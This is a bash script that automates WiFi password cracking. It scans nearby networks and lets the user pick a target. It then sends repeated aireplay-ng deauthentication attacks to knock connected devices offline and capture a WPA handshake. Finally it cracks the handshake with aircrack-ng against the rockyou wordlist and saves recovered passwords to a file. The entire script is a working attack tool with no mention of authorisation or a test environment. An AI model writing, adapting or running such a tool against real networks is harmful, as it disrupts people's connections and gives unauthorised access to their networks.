#!/bin/bash

# version: 2.0 28/12/24 04:48
# 	- Include 5G, correct writing to the wifi_passwords file | 5:27
#	- 


### To Do ###
# for scan again options, just show the list again instead of scan if its less than 1 min.
# option to run all networks or range of them at the same time.
# use GPU ?
# use differenet methods than rockyou
# - Add sort by power
# - hushcut - gpu
# - add more wordlists 
# - WPA2-WPA3
# - WPA3



# **IMPORTANT** for Alfa AWUS036AXML wifi card don't run apt upgrade. or else the card won't work.
# To enable 6Ghz run: "sudo iw reg set US" and reboot.

# Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path
# ------------------------------
# Variables
# ------------------------------
UN=$SUDO_USER
current_date=$(date +"%d_%m_%y")
targets_path="/home/$UN/Desktop/wifi_Targets"
scan_input="$targets_path/Scan/Scan-$current_date.csv"
wordlists_dir="/usr/share/wordlists"
rockyou_file="$wordlists_dir/rockyou.txt"
rockyou_gz="$wordlists_dir/rockyou.txt.gz"
gpu_enabled=false # function not exist yet

# Ensure required directories exist
mkdir -p "$targets_path"
if [ -d "$targets_path/Scan" ]; then
    rm -rf "$targets_path/Scan"
fi
mkdir "$targets_path/Scan"	    
sudo chown -R $UN:$UN $targets_path


# ------------------------------
# Dependencies Installation
# ------------------------------
function install_dependencies() {
    echo -e "\nChecking required dependencies:\n"
    packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat")
    for package in "${packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $package "; then
            sudo apt update
            echo "$package is not installed. Installing..."
            sudo apt install -y $package
        else
            echo "$package is already installed. Skipping..."
        fi
    done
}


# ------------------------------
# Check Wordlist
# ------------------------------
function check_wordlist() {
    # Check if /usr/share/wordlist directory exists, if not, create it
    if [ ! -d "$wordlists_dir" ]; then
        sudo mkdir -p "$wordlists_dir"
        echo "wordlist folder created"
    fi
    # Check if rockyou.txt exists, if yes, continue code
    if [ -f "$rockyou_file" ]; then
        echo -e "\nrockyou.txt found"
        # Continue your code here
    else
        # Check if rockyou.gz exists, if yes, unzip it
        if [ -f "$rockyou_gz" ]; then
            echo "rockyou.gz found. Unzipping..."
            sudo gzip -d "$rockyou_gz"
        else
            echo "Downloading the rockyou file..."
            sudo wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
            wait
        fi
    fi
}


# ------------------------------
# Adapter Configuration
# ------------------------------
function adapter_config() {
	sudo airmon-ng check kill    # kill proccesses that interfere with airmon-ng
	if iwconfig wlan1 &> /dev/null; then
	    wifi_adapter="wlan1"
	elif iw dev wlan1mon info &>/dev/null; then
	    wifi_adapter="wlan1"
	    echo "WiFi adapter: $wifi_adapter. The adapter already in monitor mode."
	    return 0    
	elif iwconfig wlan0 &> /dev/null; then
	    wifi_adapter="wlan0"
	elif iw dev wlan0mon info &>/dev/null; then
	    wifi_adapter="wlan0"
	    echo "WiFi adapter: $wifi_adapter. The adapter already in monitor mode."
	    return 0
	else
	    read -p "WiFi adapter not detected. Please enter the name of your WiFi adapter: " wifi_adapter
	fi  	
	echo -e "WiFi adapter: $wifi_adapter\nStarting $wifi_adapter in monitor mode"
	sudo airmon-ng start "$wifi_adapter"
	#clear
}


# ------------------------------
# Network Scanner
# ------------------------------
function network_scanner() {	
        # Scan 10 seconds for wifi networks    
        sudo gnome-terminal --geometry=110x35-10000-10000 -- timeout 10s sudo airodump-ng --band abg "$wifi_adapter"mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date        
        countdown_duration=10
        echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"

        for (( i=$countdown_duration; i>=1; i-- )); do
            tput cuu1 && tput el
            echo -e "\e[1;34mScanning for available WiFi Networks:\033[1;31m\033[1m $i \033[0m"
            sleep 1
        done
        mv $targets_path/Scan/Scan-$current_date-01.csv $scan_input
        cp "$scan_input" "$scan_input.original"
        # Edit original scan file to more organized one:
        awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $14}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
        awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp"  && mv "$scan_input.tmp" "$scan_input"
        awk '$4 != ""' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
        tail -n +2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
        head -n -1 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"
        clear
        echo -e "\n\033[1;33mAvalible WiFi Networks:\033[0m\n"
        # Display the scan input file contents with row numbers
        printf "    Name: %-35s Encryption: %-6s Channel: %-5s BSSID: %-1s\n" 
        echo
        nl -w2 -s', ' "$scan_input" | awk -F', ' '{printf "%-1s. %-42s %-16s %-16s %-5s\n", $1, $5, $4, $3, $2}'
        echo
        # Prompt the user to choose a row number
        read -p "Enter row number: " row_number
        echo
        function is_valid_number() {
            re='^[0-9]+$'
            if ! [[ $1 =~ $re ]]; then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Not a valid number."
                return 1
            fi

            num_rows=$(wc -l < "$scan_input")
            if (( $1 < 1 || $1 > num_rows )); then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Row number out of range."
                return 1
            fi

            return 0
        }

        # Keep asking for row number until a valid one is entered
        while ! is_valid_number "$row_number"; do
            echo
            read -p "Enter row number: " row_number
            echo
        done

        # Extracting values from airodump-ng scan file
        chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
        bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
        channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
        encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
        bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $4}')

        # Remove "/" from bssid name
        if [[ $bssid_name == *"/"* ]]; then
            bssid_name=${bssid_name//\//}
        fi

        # Echo values
        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
        echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
        if [ "$encryption" = "OPN" ]; then
            echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
        else
            echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
        fi
        echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
        echo
        echo

        if [ "$encryption" = "WPA3" ]; then
            echo -e "\033[1mThe encryption is WPA3. Can't crack it yet.\033[0m"
            another_scan_prompt
        elif [ "$encryption" = "OPN" ]; then
            echo -e "\033[1mThe Network is open.\033[0m"
            another_scan_prompt
        fi
        

        # If the directory exists from a previous scan, then check if we already have handshake or password
        if [ -d "$targets_path/$bssid_name" ]; then
            # First, check if we already have the Wi-Fi password for this BSSID
            if sudo grep -A1 "We got handshake for ($bssid_address): $bssid_name" "$targets_path/wifi_passwords.txt" | grep -q "The wifi password is:"; then
                wifi_password=$(sudo grep -A1 "We got handshake for ($bssid_address): $bssid_name" "$targets_path/wifi_passwords.txt" | grep "The wifi password is:" | awk -F': ' '{print $2}' | xargs)
                echo -e "\033[1;32mPassword already exists for this network!\033[0m"
                echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
                exit 0
            # If no password exists, check if we captured the handshake
            elif sudo grep -q "We got handshake for ($bssid_address): $bssid_name" "$targets_path/wifi_passwords.txt"; then
                echo -e "\033[1;32mHandshake found from previous scan!\033[0m\n"
                sudo pkill aireplay-ng
                sudo pkill airodump-ng
                echo
                echo --- >> "$targets_path/wifi_passwords.txt"
                check_previous_failure  # Check if this BSSID was previously marked as failed
                dictionary_attack
                exit 1
            else
                rm -r $targets_path/"$bssid_name"    
            fi            
        fi

        mkdir $targets_path/"$bssid_name"

        echo -e "\e[1mValidating network:\e[0m"
        gnome-terminal --geometry=105x15-10000-10000 -- script -c "sudo airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
        #sleep 10

	found=0
	for (( i=0; i<10; i++ )); do
	    if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
		found=1
		echo -e "Network available! \n"
		break
	    fi
	    sleep 1
	done

	if [ $found -eq 0 ]; then
	    sudo pkill aireplay-ng
	    sudo pkill airodump-ng
	    echo -e "\033[1mNetwork appears to be offline now.\033[0m"
	    another_scan_prompt
	fi
}



# ------------------------------
# Dvices Scanner
# ------------------------------
function devices_scanner() {
	echo -e "\e[1m\nStart scanning for devices ->>\e[0m"
	for ((i=1; i<=10; i++)); do
	    target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")

	    if [ -n "$target_devices" ]; then
		echo -e "\033[1;33m\nDevices_Found:\033[0m $target_devices" | tr ' ' '\n'
		echo
		break
	    fi
	    echo -e "Scanning for devices..  \e[1;34m$i/10\e[0m"
	    sleep 6
	done

	if [ -z "$target_devices" ]; then
	    echo -e "\033[1m\nNo device were found.\033[0m"
	    sudo pkill airodump-ng
	    rm -r $targets_path/"$bssid_name"
	    another_scan_prompt
	fi
	sleep 3
}


# ------------------------------
# Deauth Attack  
# ------------------------------
function deauth_attack() {
	    echo -e "\033[1;31m\033[1mStarting deauth attack ->>\033[0m"
	    # trying 10 times (3 minutes) the deauth attack
	    for ((i=1; i<=10; i++)); do        
		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
		for target_device in $target_devices; do
		    gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
		done		
		echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
		echo -e "$target_devices" | tr ' ' '\n',
		echo
		# waiting 18 sec after deauth attack while looking for handshake:
		for ((j=1; j<=18; j++)); do
		    sleep 1
		    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
		        echo -e "\033[1;32m->> Got the handshake!\033[0m"
		        sudo pkill aireplay-ng
			sudo pkill airodump-ng
			echo
			echo --- >> $targets_path/wifi_passwords.txt
			echo -e "We got handshake for ($bssid_address): $bssid_name                       at $(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
			break 2
		    fi    
		done
	    # after 6 unseccessfull attempts, quit the script:
	    if [ "$i" == 10 ]; then
	    	echo -e "\033[1m\nNo handshake obtained within 2 minutes. Try again.\033[0m"
	    	sudo pkill aireplay-ng
		sudo pkill airodump-ng
		rm -r $targets_path/"$bssid_name"
		another_scan_prompt
	    fi    
	  
	    done       
}


# ------------------------------
# Check Previous Attempts
# ------------------------------
function check_previous_failure() {
    if grep -A1 "We got handshake for ($bssid_address): $bssid_name" "$targets_path/wifi_passwords.txt" | grep -q "Password not found in rockyou.txt"; then
        echo -e "\033[1;31mPassword for $bssid_name (BSSID: $bssid_address) was already checked and not found in rockyou.txt file.\033[0m"    
        # Prompt the user
        echo -e "\033[1;33mWould you like to try cracking the handshake again? (Y/n)\033[0m"
        read -p "Enter your choice: " user_choice
        if [[ "$user_choice" == "y" || "$user_choice" == "Y" ]]; then
            echo -e "\n\033[1;32mContinuing to dictionary attack...\033[0m"
            # Continue in dictionary_attack function
        else
            echo -e "\033[1;33mSkipping this network and proceeding to another scan.\033[0m"
            another_scan_prompt
        fi
    fi
}



# --------------------------------------------------
# Dictionary Attack - Cracking the Password
# --------------------------------------------------
function dictionary_attack() {
	echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
	sudo aircrack-ng "$targets_path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$targets_path/$bssid_name/$bssid_name-wifi_password.txt"
	echo
	if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
	    wifi_pass=$(cat "$targets_path/$bssid_name/$bssid_name-wifi_password.txt")
	    echo -e "The wifi password of \033[1;31m\033[1m$bssid_name\033[0m is:	\033[1;31m\033[1m$wifi_pass\033[0m"
	    #echo "The wifi password is:   $wifi_pass" >> $targets_path/wifi_passwords.txt
	    sed -i "/We got handshake for ($bssid_address): $bssid_name/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
	    cleanup
	    exit 1
	else
	    echo -e "\nCouldn't finf a match from rockyou wordlist.."
	    echo -e "Password not found in rockyou.txt" >> "$targets_path/wifi_passwords.txt"
	    another_scan_prompt
	fi
}



# ------------------------------
# GPU Cracking (Hashcat)
# ------------------------------
function gpu_crack() {
    if $gpu_enabled; then
        echo "Starting Hashcat GPU attack..."
        sudo hashcat -m 2500 "$targets_path/$bssid_name/$bssid_name-01.cap" "$rockyou_file" --force
    fi
}


# ------------------------------
# Retry Prompt
# ------------------------------
function another_scan_prompt() {
    echo
    read -p "Do you want to run another scan? (Y/n): " answer
    echo
    case $answer in
        [Yy]* ) 
            main_process ;;
        [Nn]* ) 
            echo -e "\nBye."
	    cleanup
            exit 1 ;;
        * ) 
            while true; do
                echo "Please answer yes or no (Y/n)."
                echo
                read -p "Do you want to run another scan? (Y/n): " answer
                echo
                case $answer in
                    [Yy]* ) 
                        main_process
                        break ;;
                    [Nn]* ) 
                        echo -e "\nBye." 
                        cleanup
                        exit 1 ;;
                esac
            done ;;
    esac
}


# ------------------------------
# Cleanup
# ------------------------------
function cleanup() {
	sudo chown -R $UN:$UN $targets_path
	gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop "$wifi_adapter"mon
	gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
}


# ------------------------------
# Main Process
# ------------------------------
function main_process() {
	network_scanner
	devices_scanner
	deauth_attack
	dictionary_attack
}



# ------------------------------
# Script Execution
# ------------------------------
install_dependencies
check_wordlist
adapter_config
main_process

